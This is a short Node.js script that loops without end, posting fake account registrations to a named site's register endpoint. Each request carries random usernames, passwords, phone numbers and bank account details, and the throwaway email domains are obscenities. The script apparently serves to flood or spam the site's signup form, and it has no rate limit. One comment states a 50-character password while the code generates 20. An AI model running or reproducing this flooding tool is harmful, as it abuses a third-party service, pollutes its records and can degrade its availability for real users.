const axios = require('axios');
const randomstring = require('randomstring');

// Function to generate random data and make a POST request
function makeRequest() {
  // Generate random username with a length of exactly 7 characters, including letters and numbers
  const username = randomstring.generate({
    length: 7,
    charset: 'alphanumeric'
  });

  // Generate random email with specified domains
  const domains = ['ngentod.com', 'memek.nikmat', 'crotdi.dalam'];
  const randomDomain = domains[Math.floor(Math.random() * domains.length)];
  const randomEmail = `${randomstring.generate({ length: 10, charset: 'alphabetic' }).toLowerCase()}@${randomDomain}`;

  // Generate random bank account name with a length of exactly 7 alphabetic characters
  const bankAccountName = randomstring.generate({
    length: 7,
    charset: 'alphabetic',
    capitalization: 'uppercase'
  });

  // Generate random bank account number with a length of exactly 13 digits
  const bankAccountNumber = randomstring.generate({
    length: 13,
    charset: 'numeric'
  });

  // Generate random phone number with a length of exactly 13 digits
  const phoneNumber = randomstring.generate({
    length: 13,
    charset: 'numeric'
  });

  // Generate random password with a length of exactly 50 alphanumeric characters
  const password = randomstring.generate({
    length: 20,
    charset: 'alphanumeric'
  });

  const postData = {
    user: username,
    password: password,
    confirm_password: password,
    email: randomEmail,
    phone_number: phoneNumber,
    bank_name: 'dana',
    bank_account_name: bankAccountName,
    bank_account_number: bankAccountNumber,
    referral_code: '-'
  };

  axios.post('https://okbdana.com/register', postData)
    .then(response => {
      console.log('Response:', response.data);
      // Make the next request after the current one is complete
      makeRequest();
    })
    .catch(error => {
      console.error('Error:', error);
      // Make the next request even if there is an error
      makeRequest();
    });
}

// Start the first request
makeRequest();
